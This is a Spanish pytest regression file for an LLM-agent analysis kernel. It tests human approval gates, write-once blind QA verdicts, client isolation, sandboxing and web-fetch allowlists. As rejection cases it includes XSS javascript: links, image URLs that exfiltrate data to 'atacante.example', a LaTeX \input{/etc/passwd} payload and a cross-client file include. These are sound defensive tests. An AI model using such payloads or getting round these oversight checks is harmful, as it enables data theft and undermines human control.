"""M37 — Regresiones de la remediación Fase 1 y 2 (auditoría 2026-11-11).

Cada test lleva el ID del hallazgo que cierra (C1, C2, NC1-NC3, A1-A4, NA1-NA4, M3-M6, B1-B4, NM2-NM3).
"""

from __future__ import annotations

import json
import os
import re
import subprocess
import sys
import time
from pathlib import Path
from typing import Any

import pytest
from typer.testing import CliRunner

from m37 import runner
from m37.cli import (
    app,
    bless_finding,
    create_new_engagement,
    generate_plan_from_archetype,
    init_workspace,
    run_engagement,
    run_kernel_blind_qa,
)
from m37.compiler import CompilerAbortError, compile_deliverable, find_unanchored_numbers
from m37.config import (
    GitLeakSafetyError,
    WorkspacePaths,
    check_git_leak_safety,
    load_model_catalog,
)
from m37.gates import HumanGateError, approve_gate, evaluate_gate_1, evaluate_gate_2
from m37.guards import (
    AgentExecutionContext,
    ExecutionGuard,
    PermissionDeniedError,
    allocate_next_id,
    register_snapshot,
)
from m37.harness import HarnessInstallError, _resolve_python_command, install_harness_plugin
from m37.mcp_server import handle_jsonrpc_request
from m37.schemas import (
    ContractValidationError,
    dump_markdown_note,
    parse_raw_artifact,
    validate_artifact_content,
)
from m37.verify import verify_finding_phase_a

DEMO = "DEMO-01_entrada-mercado"
PAID_ENV = {
    "GEMINI_API_KEY": "gem-paid-123456789",
    "ANTHROPIC_API_KEY": "ant-paid-123456789",
    "M37_DATA_PRIVACY_ACK": "paid_billing",
}


def _guard(paths: WorkspacePaths, engagement: str, client: str, profile: str, **kw: Any) -> ExecutionGuard:
    return ExecutionGuard(
        paths,
        AgentExecutionContext(engagement_id=engagement, client_id=client, node_id="N-T", profile=profile, **kw),
    )


def _evidence_md(ev_id: str, engagement: str, snapshot: str | None, quote: str) -> str:
    snap_line = f"snapshot_local: {snapshot}\n" if snapshot else ""
    return (
        "---\n"
        f"id: {ev_id}\n"
        "tipo: evidencia\n"
        "visibilidad: interna_encargo\n"
        f"encargo_origen: {engagement}\n"
        "clase: documento_interno\n"
        "titulo: Documento de prueba\n"
        "emisor_o_autor: Área de pruebas\n"
        "fecha_verificacion: '2026-11-01'\n"
        "vigencia_dias_max: 3650\n"
        "localizador_verificable: sección 1\n"
        f"{snap_line}"
        "fiabilidad: media\n"
        "cita_verificada: true\n"
        "origen_snapshot: kernel_fetch\n"
        "---\n\n"
        "## Síntesis sustantiva\n\nResumen.\n\n"
        f'## Extracto o referencia verificable\n\n"{quote}"\n\n'
        "## Límites y sesgos de la fuente\n\nNinguno relevante para la prueba.\n"
    )


def _finding_md(h_id: str, engagement: str, ev_id: str, claim: str = "La retención observada fue estable.") -> str:
    return (
        "---\n"
        f"id: {h_id}\n"
        "tipo: hallazgo\n"
        f"encargo: {engagement}\n"
        "dominio: estrategia-base\n"
        "naturaleza: estrategico\n"
        "fuerza_afirmacion: inferencia_condicionada\n"
        f"afirmacion_corta: {claim} Condicionada a la muestra.\n"
        f"sustento_evidencia:\n  - '[[{ev_id}]]'\n"
        "metodo: matriz-comparativa-alternativas\n"
        "hash_insumos: auto\n"
        "confianza: media\n"
        "contrahipotesis_probadas: 1\n"
        "que_lo_refutaria: Una caída sostenida en la cohorte siguiente.\n"
        "---\n\n"
        f"## Afirmación\n\n{claim}\n\n"
        "## Sustento y trazabilidad\n\nVer evidencia citada.\n\n"
        "## Explicaciones rivales descartadas\n\nSe descartó estacionalidad.\n\n"
        "## Condiciones de validez y límites\n\nSolo la cohorte auditada.\n"
    )


def _engagement_with_finding(tmp_path: Path, rigor: str = "L2") -> tuple[WorkspacePaths, str, str]:
    """Workspace con un encargo en modo harness, puertas selladas, una evidencia y un hallazgo."""
    paths = init_workspace(tmp_path / "ws", clean_l4=True)
    enc = "ENC-QA-01"
    create_new_engagement(paths, enc, "CLI_QA", rigor=rigor)  # type: ignore[arg-type]
    generate_plan_from_archetype(paths, enc, approve_gate_1=True, approve_gate_2=True, harness_mode=True)
    _guard(paths, enc, "CLI_QA", "documental").write_note(
        f"vault/20_Encargos/{enc}/Evidencia_Interna/EI-{enc}-01.md",
        _evidence_md(f"EI-{enc}-01", enc, None, "la retención observada fue estable en la cohorte"),
    )
    _guard(paths, enc, "CLI_QA", "analitico").write_note(
        f"vault/20_Encargos/{enc}/Hallazgos/H-{enc}-01.md",
        _finding_md(f"H-{enc}-01", enc, f"EI-{enc}-01"),
    )
    return paths, enc, f"H-{enc}-01"


def _qa_llm(decision: str):
    def _llm(*, model: str, messages: list, tools: Any = None, **kwargs: Any) -> dict[str, Any]:
        if messages[-1]["role"] == "tool":
            return {"choices": [{"message": {"content": "Listo.", "tool_calls": None}}], "usage": {}}
        prompt = messages[1]["content"]
        m = re.search(r"escribe el veredicto en `([^`]+)` con id `([^`]+)`", prompt)
        audited = re.search(r"el artefacto `([^`]+)\.md`", prompt)
        ronda = int(re.search(r"Audita en Ronda (\d)", prompt).group(1))  # type: ignore[union-attr]
        assert m and audited
        verdict = (
            f"---\nid: {m.group(2)}\ntipo: veredicto_qa\nencargo: ENC-QA-01\n"
            f"artefacto_auditado: '[[{audited.group(1)}]]'\nronda: {ronda}\n"
            "modelo_auditor: x\nfamilia_auditor: x\nfase_a_mecanica: aprobada\n"
            "mejor_ataque: La cohorte auditada puede no representar al universo completo.\n"
            f"hallazgos_critica: []\ndecision: {decision}\n---\n\n## Dictamen\n\nSimulado.\n"
        )
        call = {"id": "t1", "function": {"name": "write_note", "arguments": json.dumps({"path": m.group(1), "content": verdict})}}
        return {"choices": [{"message": {"content": "", "tool_calls": [call]}}], "usage": {}}

    return _llm


# ----------------------------------------------------------------------------------------------------------------------
# C1 — la ruta real de proveedor ya no falla antes de la primera llamada
# ----------------------------------------------------------------------------------------------------------------------
def test_c1_real_provider_path_builds_a_valid_call(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    paths = init_workspace(tmp_path / "ws")
    entry = load_model_catalog(paths.modelos_yaml_path()).modelos["gemini_flash"]
    seen: list[dict[str, Any]] = []

    class _FakeLiteLLM:
        @staticmethod
        def completion(**kwargs: Any) -> dict[str, Any]:
            seen.append(kwargs)
            return {"choices": [{"message": {"content": "fin", "tool_calls": None}}], "usage": {"prompt_tokens": 3, "completion_tokens": 1}}

        @staticmethod
        def completion_cost(**kwargs: Any) -> float:
            return 0.0

    monkeypatch.setattr(runner, "_get_litellm", lambda: _FakeLiteLLM)
    ctx = AgentExecutionContext(
        engagement_id=DEMO, client_id="ACME", node_id="N-X", profile="documental", base_env={"GEMINI_API_KEY": "k" * 20}
    )
    out = runner.execute_stateless_node_loop(paths, ctx, entry, "sys", "user", max_turns=1)  # completion_fn=None
    assert out.status == "completado"
    assert seen[0]["max_tokens"] == entry.limites_operativos.max_output_tokens > 0
    assert seen[0]["api_key"] == "k" * 20

    # Modelos locales: credencial_env null no debe indexar el entorno con None
    local = entry.model_copy(update={"credencial_env": None})
    out_local = runner.execute_stateless_node_loop(paths, ctx, local, "sys", "user", max_turns=1)
    assert out_local.status == "completado" and "api_key" not in seen[1]


# ----------------------------------------------------------------------------------------------------------------------
# NC1 / A4 — puertas humanas
# ----------------------------------------------------------------------------------------------------------------------
def test_nc1_a4_gates_need_a_seal_and_cover_routing_budget_and_dependencies(tmp_path: Path) -> None:
    paths = init_workspace(tmp_path / "ws", clean_l4=True)
    create_new_engagement(paths, "ENC-G-01", "CLI_G", rigor="L2")
    enc_dir = paths.engagement_dir("ENC-G-01")
    brief = enc_dir / "00_Brief.md"

    # Escribir puerta_1_aprobada: true a mano no aprueba nada
    b_meta, b_body = parse_raw_artifact(brief.read_text(encoding="utf-8"), suffix=".md")
    b_meta["puerta_1_aprobada"] = True
    brief.write_text(dump_markdown_note(b_meta, b_body), encoding="utf-8")
    assert evaluate_gate_1(b_meta, b_body) == (False, evaluate_gate_1(b_meta, b_body)[1])
    with pytest.raises(HumanGateError, match="sin sello"):
        generate_plan_from_archetype(paths, "ENC-G-01", env=PAID_ENV)

    res = approve_gate(paths, "ENC-G-01", 1, approver="socia")
    b_meta, b_body = parse_raw_artifact(brief.read_text(encoding="utf-8"), suffix=".md")
    assert b_meta["puerta_1_aprobado_por"] == "socia" and b_meta["puerta_1_fecha_utc"] and res["sha256"]

    generate_plan_from_archetype(paths, "ENC-G-01", env=PAID_ENV)
    assert evaluate_gate_2(enc_dir)[0] is False  # generar el plan no lo aprueba
    approve_gate(paths, "ENC-G-01", 2, approver="socia")
    assert evaluate_gate_2(enc_dir) == (True, "Puerta 2 vigente.")

    n1 = enc_dir / "Nodos" / "N-01.md"
    original = n1.read_text(encoding="utf-8")
    for mutate in (
        lambda m: m["enrutamiento_modelo"].__setitem__("presupuesto_max_usd", 50.0),
        lambda m: m["enrutamiento_modelo"].__setitem__("modelo_qa_critico", m["enrutamiento_modelo"]["modelo_ejecutor"]),
        lambda m: m.__setitem__("depende_de", ["N-99"]),
    ):
        n_meta, n_body = parse_raw_artifact(original, suffix=".md")
        mutate(n_meta)
        n1.write_text(dump_markdown_note(n_meta, n_body), encoding="utf-8")
        ok, reason = evaluate_gate_2(enc_dir)
        assert ok is False and "invalidada" in reason
    n1.write_text(original, encoding="utf-8")
    assert evaluate_gate_2(enc_dir)[0] is True

    # El estado de ejecución del nodo NO invalida la puerta (y el kernel ya no la re-sella)
    n_meta, n_body = parse_raw_artifact(original, suffix=".md")
    n_meta["estado"] = "aceptado"
    n1.write_text(dump_markdown_note(n_meta, n_body), encoding="utf-8")
    assert evaluate_gate_2(enc_dir)[0] is True


def test_nc1_human_commands_refuse_to_run_without_an_interactive_terminal(tmp_path: Path) -> None:
    paths = init_workspace(tmp_path / "ws")
    create_new_engagement(paths, "ENC-TTY-01", "CLI_T", rigor="L2")
    cli = CliRunner()
    base = ["--vault", str(paths.workspace_root)]
    for argv in (
        ["approve", "ENC-TTY-01", "--gate", "1", *base],
        ["plan", "ENC-TTY-01", "--approve-gate-1", *base],
        ["bless", "H-X", "--encargo", DEMO, "--justificacion", "Revisión humana completa del hallazgo", *base],
        ["ingest", str(tmp_path / "x.txt"), "--encargo", DEMO, *base],
    ):
        result = cli.invoke(app, argv)
        assert result.exit_code != 0, argv
        assert isinstance(result.exception, HumanGateError), (argv, result.exception)
    assert evaluate_gate_1(*parse_raw_artifact((paths.engagement_dir("ENC-TTY-01") / "00_Brief.md").read_text(encoding="utf-8"), suffix=".md"))[0] is False


def test_na4_harness_plans_declare_their_mode_and_cannot_be_run_by_the_api_runner(tmp_path: Path) -> None:
    paths = init_workspace(tmp_path / "ws", clean_l4=True)
    create_new_engagement(paths, "ENC-H-01", "CLI_H", rigor="L2")
    plan_path, nodes = generate_plan_from_archetype(
        paths, "ENC-H-01", approve_gate_1=True, approve_gate_2=True, harness_mode=True, env={}
    )
    p_meta, _ = parse_raw_artifact(plan_path.read_text(encoding="utf-8"), suffix=".md")
    assert p_meta["modo_ejecucion"] == "harness" and p_meta["presupuesto_total_estimado_usd"] == 0.0
    for node in nodes:
        n_meta, _ = parse_raw_artifact(node.read_text(encoding="utf-8"), suffix=".md")
        assert n_meta["enrutamiento_modelo"]["modelo_ejecutor"] == "harness_anfitrion"
        assert n_meta["enrutamiento_modelo"]["modelo_qa_critico"] is None
    with pytest.raises(PermissionError, match="modo harness"):
        run_engagement(paths, "ENC-H-01", env=PAID_ENV, completion_fn=lambda **k: {})


# ----------------------------------------------------------------------------------------------------------------------
# NC2 / M3 / M4 — procedencia de snapshots y Muralla China en referencias/
# ----------------------------------------------------------------------------------------------------------------------
def test_nc2_m4_only_registered_snapshots_can_verify_a_citation(tmp_path: Path) -> None:
    paths = init_workspace(tmp_path / "ws", clean_l4=True)
    enc = "ENC-S-01"
    create_new_engagement(paths, enc, "CLI_S", rigor="L3")
    doc = _guard(paths, enc, "CLI_S", "documental")
    quote = "la adopción del servicio creció de forma sostenida"

    def _write(ev_num: int, snapshot: str | None) -> dict[str, Any]:
        rel = doc.write_note(
            f"vault/20_Encargos/{enc}/Evidencia_Interna/EI-{enc}-{ev_num:02d}.md",
            _evidence_md(f"EI-{enc}-{ev_num:02d}", enc, snapshot, quote),
        )
        return parse_raw_artifact((paths.workspace_root / rel).read_text(encoding="utf-8"), suffix=".md")[0]

    # 1. Un archivo que alguien dejó en referencias/ sin registro NO es una fuente
    fake = paths.referencias_root / enc / "inventado.txt"
    fake.parent.mkdir(parents=True, exist_ok=True)
    fake.write_text(f"Informe imaginario: {quote}.\n", encoding="utf-8")
    meta = _write(1, f"referencias/{enc}/inventado.txt")
    assert meta["cita_verificada"] is False and "origen_snapshot" not in meta

    # 2. Registrado por una persona => verificable, con procedencia estampada por el kernel
    register_snapshot(paths, fake, "ingesta_humana", author="socia")
    meta = _write(2, f"referencias/{enc}/inventado.txt")
    assert meta["cita_verificada"] is True and meta["origen_snapshot"] == "ingesta_humana"

    # 3. Si el archivo cambia después del registro, deja de contar
    fake.write_text(f"Texto reescrito: {quote} y algo más.\n", encoding="utf-8")
    meta = _write(3, f"referencias/{enc}/inventado.txt")
    assert meta["cita_verificada"] is False

    # 4. M4: snapshot_local no puede apuntar a archivos vetados para usar el kernel como oráculo
    paths.episodios_path().write_text(f'{{"nota": "{quote}"}}\n', encoding="utf-8")
    meta = _write(4, "vault/90_Bitacora/episodios.jsonl")
    assert meta["cita_verificada"] is False and meta["hash_snapshot"] is None

    # 5. Fase A en L3: un `cita_verificada: true` escrito a mano sin snapshot no pasa
    ev5 = paths.engagement_dir(enc) / "Evidencia_Interna" / f"EI-{enc}-05.md"
    ev5.write_text(_evidence_md(f"EI-{enc}-05", enc, None, quote).replace("origen_snapshot: kernel_fetch\n", ""), encoding="utf-8")
    h_rel = _guard(paths, enc, "CLI_S", "analitico").write_note(
        f"vault/20_Encargos/{enc}/Hallazgos/H-{enc}-01.md", _finding_md(f"H-{enc}-01", enc, f"EI-{enc}-05")
    )
    res = verify_finding_phase_a(paths, enc, paths.workspace_root / h_rel, rigor="L3")
    assert not res.passed and any("sin snapshot_local" in e for e in res.errors)


def test_m3_references_are_engagement_scoped_except_the_public_pool(tmp_path: Path) -> None:
    paths = init_workspace(tmp_path / "ws", clean_l4=True)
    create_new_engagement(paths, "ENC-A", "CLI_A", rigor="L2")
    create_new_engagement(paths, "ENC-B", "CLI_B", rigor="L2")
    (paths.referencias_root / "ENC-B").mkdir(parents=True)
    (paths.referencias_root / "ENC-B" / "privado.txt").write_text("de B\n", encoding="utf-8")
    (paths.referencias_root / "_publico").mkdir(parents=True)
    pub = paths.referencias_root / "_publico" / "web.txt"
    pub.write_text("pagina publica\n", encoding="utf-8")
    register_snapshot(paths, pub, "kernel_fetch", url="https://ejemplo.org")
    doc_a = _guard(paths, "ENC-A", "CLI_A", "documental")

    with pytest.raises(PermissionDeniedError, match="Muralla China"):
        doc_a.read_file("referencias/ENC-B/privado.txt")
    with pytest.raises(PermissionDeniedError):
        doc_a.read_file("referencias/.m37_snapshots.json")  # el registro es solo del kernel
    assert "pagina publica" in doc_a.read_file("referencias/_publico/web.txt")
    listed = doc_a.list_files("referencias")
    assert "referencias/_publico/web.txt" in listed and not any("ENC-B" in p or ".m37_snapshots" in p for p in listed)


# ----------------------------------------------------------------------------------------------------------------------
# NC3 / B3 — veredictos
# ----------------------------------------------------------------------------------------------------------------------
def test_nc3_b3_verdicts_are_write_once_and_bless_is_reserved_to_humans(tmp_path: Path) -> None:
    paths = init_workspace(tmp_path / "ws")
    qa = _guard(paths, DEMO, "ACME", "qa_ciego", model_alias="m", model_family="f", assigned_qa_target="H-DEMO-01-01")
    existing = (paths.engagement_dir(DEMO) / "QA" / "V-DEMO-01-01.md").read_text(encoding="utf-8")

    with pytest.raises(PermissionDeniedError, match="escritura única"):
        qa.write_note(f"vault/20_Encargos/{DEMO}/QA/V-DEMO-01-01.md", existing)
    with pytest.raises(PermissionDeniedError, match="V-BLESS"):
        qa.write_note(f"vault/20_Encargos/{DEMO}/QA/V-BLESS-H-DEMO-01-01.md", existing)
    with pytest.raises(PermissionDeniedError, match="V-BLESS"):
        qa.write_note(
            f"vault/20_Encargos/{DEMO}/QA/V-DEMO-01-09.md",
            existing.replace("id: V-DEMO-01-01", "id: V-BLESS-H-DEMO-01-01"),
        )
    # El acta humana sigue funcionando por su propio camino
    assert bless_finding(paths, DEMO, "H-DEMO-01-01", "Revisión humana completa del hallazgo").name.startswith("V-BLESS-")


def test_nc3_kernel_qa_rounds_no_verdict_shopping_and_two_round_cap(tmp_path: Path) -> None:
    paths, enc, hid = _engagement_with_finding(tmp_path)
    env = {**PAID_ENV, "M37_HARNESS_FAMILY": "anthropic"}
    hpath = paths.engagement_dir(enc) / "Hallazgos" / f"{hid}.md"

    r1 = run_kernel_blind_qa(paths, enc, hid, env=env, completion_fn=_qa_llm("rechazar"))
    assert r1["ronda"] == 1 and r1["decision"] == "rechazar" and r1["familia_qa"] == "google"
    assert (paths.engagement_dir(enc) / "QA" / ".r1" / f"{r1['veredicto']}.snapshot").is_file()

    with pytest.raises(ValueError, match="no cambió desde el rechazo"):
        run_kernel_blind_qa(paths, enc, hid, env=env, completion_fn=_qa_llm("aceptar"))

    hpath.write_text(hpath.read_text(encoding="utf-8").replace("Se descartó estacionalidad.", "Se descartó estacionalidad con 24 meses."), encoding="utf-8")
    r2 = run_kernel_blind_qa(paths, enc, hid, env=env, completion_fn=_qa_llm("rechazar"))
    assert r2["ronda"] == 2 and r2["estado_qa_hallazgo"] == "rechazado"

    hpath.write_text(hpath.read_text(encoding="utf-8").replace("24 meses", "36 meses"), encoding="utf-8")
    with pytest.raises(PermissionError, match="agotó las 2 rondas"):
        run_kernel_blind_qa(paths, enc, hid, env=env, completion_fn=_qa_llm("aceptar"))

    # Sin declarar la familia del autor el kernel no puede garantizar un auditor distinto
    with pytest.raises(ValueError, match="familia del modelo que redactó"):
        run_kernel_blind_qa(paths, enc, hid, env=PAID_ENV, completion_fn=_qa_llm("aceptar"))


# ----------------------------------------------------------------------------------------------------------------------
# C2 / A1 — backends de sandbox
# ----------------------------------------------------------------------------------------------------------------------
@pytest.mark.strict_isolation
def test_c2_process_backend_refuses_compute_when_the_workspace_holds_several_clients(tmp_path: Path) -> None:
    paths = init_workspace(tmp_path / "ws")  # incluye DEMO/ACME, que no cuenta como cliente real
    create_new_engagement(paths, "ENC-A", "CLI_A", rigor="L2")
    g = _guard(paths, "ENC-A", "CLI_A", "analitico", allow_compute=True)
    g.write_sandbox_script("ok.py", "print('hola')\n")
    assert g.run_sandbox_script("ok.py")["stdout"].strip() == "hola"  # un solo cliente real: permitido

    create_new_engagement(paths, "ENC-B", "CLI_B", rigor="L2")
    with pytest.raises(PermissionDeniedError, match="2 clientes"):
        g.run_sandbox_script("ok.py")
    with pytest.raises(PermissionDeniedError, match="2 clientes"):
        _guard(paths, "ENC-A", "CLI_A", "construccion", allow_compute=True).run_verification_cmd("pytest -q")

    # Asumir el riesgo es una decisión explícita del operador
    g_override = _guard(
        paths, "ENC-A", "CLI_A", "analitico", allow_compute=True, base_env={"M37_ALLOW_SHARED_WORKSPACE_COMPUTE": "1"}
    )
    assert g_override.run_sandbox_script("ok.py")["exit_code"] == 0


def test_c2_container_backend_mounts_only_the_engagement_and_has_no_network(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    paths = init_workspace(tmp_path / "ws", clean_l4=True)
    create_new_engagement(paths, "ENC-A", "CLI_A", rigor="L2")
    create_new_engagement(paths, "ENC-B", "CLI_B", rigor="L2")
    (paths.datos_root / "ENC-B" / "crudos" / "nomina.csv").write_text("a,b\n1,2\n", encoding="utf-8")
    g = _guard(paths, "ENC-A", "CLI_A", "analitico", allow_compute=True, sandbox_backend="container")
    g.write_sandbox_script("m.py", "print(1)\n")

    from m37 import guards as guards_mod

    monkeypatch.setattr(guards_mod, "find_container_runtime", lambda preferred="": None)
    with pytest.raises(PermissionDeniedError, match="no se encontró docker ni podman"):
        g.run_sandbox_script("m.py")

    captured: dict[str, Any] = {}

    def _fake_run(argv: list[str], **kwargs: Any) -> subprocess.CompletedProcess[str]:
        captured["argv"] = argv
        return subprocess.CompletedProcess(argv, 0, stdout='{"x": 1}\n', stderr="")

    monkeypatch.setattr(guards_mod, "find_container_runtime", lambda preferred="": "/usr/bin/docker")
    monkeypatch.setattr(guards_mod.subprocess, "run", _fake_run)
    res = g.run_sandbox_script("m.py")
    assert res["backend"] == "container" and res["exit_code"] == 0

    argv = captured["argv"]
    joined = " ".join(argv)
    assert argv[:3] == ["/usr/bin/docker", "run", "--rm"]
    assert argv[argv.index("--network") + 1] == "none"
    assert "--read-only" in argv and argv[argv.index("--cap-drop") + 1] == "ALL"
    mounts = [argv[i + 1] for i, tok in enumerate(argv) if tok == "--mount"]
    assert mounts and all("ENC-B" not in m and "CLI_B" not in m and "10_Clientes" not in m for m in mounts)
    assert "ENC-B" not in joined and "90_Bitacora" not in joined
    rw = [m for m in mounts if not m.endswith(",readonly")]
    assert sorted(m.split("target=")[1] for m in rw) == ["/m37/analisis/ENC-A", "/m37/datos/ENC-A/procesados"]
    assert any(m.endswith("target=/m37/datos/ENC-A,readonly") for m in mounts)
    assert argv[-2:] == ["python", "/m37/analisis/ENC-A/m.py"]
    # Sin secretos del host en el entorno del contenedor
    env_tokens = [argv[i + 1] for i, tok in enumerate(argv) if tok == "-e"]
    assert not any("KEY" in e or "TOKEN" in e for e in env_tokens)


def test_a1_ffi_is_blocked_by_default_and_can_be_enabled_for_the_data_stack(tmp_path: Path) -> None:
    paths = init_workspace(tmp_path / "ws", clean_l4=True)
    create_new_engagement(paths, "ENC-A", "CLI_A", rigor="L2")
    script = "import ctypes\nprint(ctypes.sizeof(ctypes.c_int))\n"
    blocked = _guard(paths, "ENC-A", "CLI_A", "analitico", allow_compute=True)
    blocked.write_sandbox_script("ffi.py", script)
    with pytest.raises(PermissionDeniedError):
        blocked.run_sandbox_script("ffi.py")
    allowed = _guard(paths, "ENC-A", "CLI_A", "analitico", allow_compute=True, base_env={"M37_SANDBOX_ALLOW_FFI": "1"})
    res = allowed.run_sandbox_script("ffi.py")
    assert res["exit_code"] == 0 and res["stdout"].strip() == "4"


# ----------------------------------------------------------------------------------------------------------------------
# A2 / A3 / M5 / B4 — compilador
# ----------------------------------------------------------------------------------------------------------------------
def _compile_demo_with(tmp_path: Path, extra_block: str) -> str:
    paths = init_workspace(tmp_path / "ws")
    informe = paths.engagement_dir(DEMO) / "Entregables" / "Informe.md"
    informe.write_text(informe.read_text(encoding="utf-8").rstrip() + "\n\n" + extra_block + "\n", encoding="utf-8")
    out = compile_deliverable(paths, DEMO)
    return out.html_path.read_text(encoding="utf-8")


SUSTENTO = "<!-- sustento: H-DEMO-01-01 -->"


def test_a2_demo_still_compiles_with_an_honest_scope_label(tmp_path: Path) -> None:
    html_text = _compile_demo_with(tmp_path, f"El análisis consideró 2 escenarios y un horizonte de 36 meses. {SUSTENTO}")
    assert "Trazabilidad Verificada" not in html_text
    assert "prosa no auditada por QA" in html_text
    paths = WorkspacePaths.from_root(tmp_path / "ws")
    trace = json.loads((paths.render_root / DEMO / "mapa_trazabilidad.json").read_text(encoding="utf-8"))
    assert "no_verificado" in trace["alcance_verificacion"]
    assert trace["qa_por_hallazgo"]["H-DEMO-01-01"]["familia_auditor"] == "anthropic"


@pytest.mark.parametrize(
    "prose",
    [
        "El mercado crecerá 47% el próximo año.",
        "El ahorro adicional será de USD 93M.",
        "Captaremos 4000 clientes nuevos.",
        "El ingreso se multiplicará 2.7x.",
        "La cuota llegará a 3 de cada 41 flotas.",
    ],
)
def test_a2_figures_absent_from_the_cited_sustento_abort_compilation(tmp_path: Path, prose: str) -> None:
    with pytest.raises(CompilerAbortError) as exc:
        _compile_demo_with(tmp_path, f"{prose} {SUSTENTO}")
    assert exc.value.pass_number == 3


def test_a2_allowed_set_ignores_frontmatter_noise_and_numeric_strings_are_figures() -> None:
    # Antes: 37 de los enteros 1..100 pasaban por dígitos de fechas y hashes del frontmatter.
    assert find_unanchored_numbers("Creció 26% y luego 74%.", {"18.4", "28.500", "78", "8.8"}) == ["26", "74"]
    assert find_unanchored_numbers("Hay 3 escenarios y 2 corredores.", set()) == []
    assert find_unanchored_numbers("1. Primer punto\n2. Segundo punto", set()) == []

    deriv = {
        "id": "D-X-01",
        "tipo": "derivacion",
        "encargo": "X",
        "metodo": "m",
        "productor_modo": "estructuracion_analitica",
        "productor_ref": "n/a",
        "insumos": [{"id_o_ruta": "E-1", "sha256": "0"}],
        "salidas": {"conclusion": "viable con reservas"},
    }
    validate_artifact_content(json.dumps(deriv), suffix=".json", expected_tipo="derivacion")
    for smuggled in ("37%", "1.60", "USD 12M", "22 meses"):
        with pytest.raises(ContractValidationError, match="salidas numéricas"):
            validate_artifact_content(
                json.dumps({**deriv, "salidas": {"valor": smuggled}}), suffix=".json", expected_tipo="derivacion"
            )


@pytest.mark.parametrize(
    "block",
    [
        "Ver [detalle](javascript:alert(document.domain)) aquí.",
        "Ver [detalle](JaVaScRiPt:alert(1)) aquí.",
        "Ver [detalle][r] aquí.\n\n[r]: data:text/html;base64,PHNjcmlwdD4=",
        "Nota ![x](https://atacante.example/p.png?d=VAN) final.",
        "Nota ![x](//atacante.example/p.png) final.",
        "```{=latex}\n\\input{/etc/passwd}\n```",
        "```{=html}\n<b>x</b>\n```",
        "Texto `<b>x</b>`{=html} en línea.",
        "{{< include ../../vault/10_Clientes/ACME/Perfil.md >}}",
    ],
)
def test_a3_m5_active_markup_is_rejected_in_pass_1(tmp_path: Path, block: str) -> None:
    with pytest.raises(CompilerAbortError) as exc:
        _compile_demo_with(tmp_path, f"{block} {SUSTENTO}")
    assert exc.value.pass_number == 1


def test_a3_safe_links_survive_and_b4_format_specs_are_bounded(tmp_path: Path) -> None:
    html_text = _compile_demo_with(tmp_path, f"Fuente: [ORCS](https://ejemplo.org/orcs) y [contacto](mailto:a@b.co). {SUSTENTO}")
    assert 'href="https://ejemplo.org/orcs"' in html_text and 'href="mailto:a@b.co"' in html_text
    with pytest.raises(CompilerAbortError, match="no permitido"):
        _compile_demo_with(tmp_path / "b", f"Valor {{{{D-DEMO-01-01.van_musd | fmt('>30000000')}}}} {SUSTENTO}")


# ----------------------------------------------------------------------------------------------------------------------
# A3 — política de web_fetch_clean (sin tocar la red: todo se rechaza antes de conectar)
# ----------------------------------------------------------------------------------------------------------------------
def test_a3_web_fetch_respects_the_brief_allowlist_and_url_limits(tmp_path: Path) -> None:
    paths = init_workspace(tmp_path / "ws", clean_l4=True)
    create_new_engagement(paths, "ENC-W", "CLI_W", rigor="L3")
    public_ip_url = "https://93.184.216.34/informe"

    l3_no_list = _guard(paths, "ENC-W", "CLI_W", "documental", web_requires_allowlist=True)
    with pytest.raises(PermissionDeniedError, match="dominios_web_permitidos"):
        l3_no_list.web_fetch_clean(public_ip_url)

    listed = _guard(paths, "ENC-W", "CLI_W", "documental", web_allowed_domains=("inegi.org.mx",), web_requires_allowlist=True)
    with pytest.raises(PermissionDeniedError, match="no está en dominios_web_permitidos"):
        listed.web_fetch_clean(public_ip_url)
    listed._enforce_web_fetch_policy("https://www.inegi.org.mx/programas/enoe/")
    with pytest.raises(PermissionDeniedError):
        listed._enforce_web_fetch_policy("https://inegi.org.mx.atacante.example/x")
    with pytest.raises(PermissionDeniedError, match="credenciales"):
        listed._enforce_web_fetch_policy("https://u:p@www.inegi.org.mx/")
    with pytest.raises(PermissionDeniedError, match="query"):
        _guard(paths, "ENC-W", "CLI_W", "documental")._enforce_web_fetch_policy("https://ejemplo.org/?d=" + "A" * 300)

    # El Brief valida el formato de los dominios y los cubre con el hash de Puerta 1
    brief = paths.engagement_dir("ENC-W") / "00_Brief.md"
    approve_gate(paths, "ENC-W", 1)
    b_meta, b_body = parse_raw_artifact(brief.read_text(encoding="utf-8"), suffix=".md")
    b_meta["dominios_web_permitidos"] = ["atacante.example"]
    brief.write_text(dump_markdown_note(b_meta, b_body), encoding="utf-8")
    assert "invalidada" in evaluate_gate_1(b_meta, b_body)[1]
    b_meta["dominios_web_permitidos"] = ["https://con-esquema.example/ruta"]
    with pytest.raises(ContractValidationError, match="Dominio inválido"):
        validate_artifact_content(dump_markdown_note(b_meta, b_body), suffix=".md", expected_tipo="brief")


# ----------------------------------------------------------------------------------------------------------------------
# NA3 — instalador
# ----------------------------------------------------------------------------------------------------------------------
def test_na3_installer_merges_instead_of_overwriting_and_keeps_a_backup(tmp_path: Path) -> None:
    home, proj = tmp_path / "home", tmp_path / "proj"
    home.mkdir()
    proj.mkdir()
    (proj / "CLAUDE.md").write_text("# Mis reglas del proyecto\n\nNo tocar producción.\n", encoding="utf-8")
    (proj / "AGENTS.md").write_text("# Reglas para agentes\n", encoding="utf-8")
    (proj / ".mcp.json").write_text(json.dumps({"mcpServers": {"otro": {"command": "x"}}}), encoding="utf-8")
    (home / ".claude.json").write_text(json.dumps({"cuenta": {"id": 1}, "mcpServers": {"previo": {"command": "y"}}}), encoding="utf-8")

    for _ in range(2):  # idempotente
        install_harness_plugin(target="all", scope="both", workspace_dir=proj, home_dir=home)

    claude_md = (proj / "CLAUDE.md").read_text(encoding="utf-8")
    assert claude_md.startswith("# Mis reglas del proyecto") and "No tocar producción." in claude_md
    assert claude_md.count("M37-RULES-START") == 1 and "Las puertas son de la persona" in claude_md
    assert (proj / "CLAUDE.md.m37.bak").read_text(encoding="utf-8") == "# Mis reglas del proyecto\n\nNo tocar producción.\n"
    assert (proj / "AGENTS.md").read_text(encoding="utf-8").startswith("# Reglas para agentes")

    servers = json.loads((proj / ".mcp.json").read_text(encoding="utf-8"))["mcpServers"]
    assert set(servers) == {"otro", "m37-kernel"}
    assert "PYTHONPATH" not in servers["m37-kernel"]["env"]
    assert servers["m37-kernel"]["command"] == Path(sys.executable).absolute().as_posix()
    global_cfg = json.loads((home / ".claude.json").read_text(encoding="utf-8"))
